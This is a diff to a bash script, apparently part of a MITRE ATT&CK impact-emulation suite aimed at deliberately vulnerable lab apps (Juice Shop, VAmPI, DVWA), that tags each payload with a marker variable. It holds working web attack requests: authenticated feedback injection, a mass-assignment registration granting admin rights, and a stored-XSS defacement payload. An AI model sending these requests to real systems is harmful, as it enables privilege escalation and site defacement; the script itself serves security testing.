@@ -7,6 +7,7 @@ set -uo pipefail
 
 TARGET="${1:?Usage: 07-impact.sh <TARGET_FQDN>}"
 BASE="${TARGET_PROTOCOL:-http}://${TARGET}"
+MARKER="${TGEN_FAMILY_MARKER:?Run through the native mixed-family journal}"
 
 echo "[*] MITRE ATT&CK TA0040: Impact against ${TARGET}"
 echo ""
@@ -64,7 +65,7 @@ if [[ -n "$token" ]] && [[ "$token" != "null" ]]; then
   code=$(curl -sf -o /dev/null -w "%{http_code}" -X POST "${BASE}/juice-shop/api/Feedbacks" \
     -H "Content-Type: application/json" \
     -H "Authorization: Bearer ${token}" \
-    -d '{"comment":"[MITRE T1565] Data manipulation test - injected feedback","rating":1}' \
+    -d "{\"comment\":\"${MARKER}:[MITRE T1565] Data manipulation test - injected feedback\",\"rating\":1}" \
     --max-time 10) || code="ERR"
   echo "  [VULN] Feedback injection: HTTP ${code}"
 else
@@ -76,7 +77,7 @@ echo "  [T1565.b] VAmPI mass assignment (privilege escalation):"
 ts=$(date +%s)
 curl -sf -X POST "${BASE}/vampi/users/v1/register" \
   -H "Content-Type: application/json" \
-  -d "{\"username\":\"mitre${ts}\",\"password\":\"test123\",\"email\":\"mitre${ts}@test.com\",\"admin\":true,\"role\":\"admin\"}" \
+  -d "{\"username\":\"${MARKER}\",\"password\":\"test123\",\"email\":\"${MARKER}@example.com\",\"admin\":true,\"role\":\"admin\"}" \
   --max-time 10 2>/dev/null | jq -c '.' 2>/dev/null
 echo ""
 
@@ -84,7 +85,7 @@ echo "=== T1491.002: Defacement — External Defacement ==="
 echo "    Technique: XSS stored payload for persistent page modification"
 echo "  [T1491] Stored XSS via DVWA guestbook (requires auth):"
 code=$(curl -sf -o /dev/null -w "%{http_code}" \
-  -d "txtName=MITRE&mtxMessage=<h1>Defaced by T1491</h1>&btnSign=Sign+Guestbook" \
+  -d "txtName=MITRE&mtxMessage=${MARKER}:<h1>Defaced by T1491</h1>&btnSign=Sign+Guestbook" \
   "${BASE}/dvwa/vulnerabilities/xss_s/" --max-time 10) || code="ERR"
 echo "  Guestbook injection: HTTP ${code} (302=needs auth, 200=injected)"
 echo ""
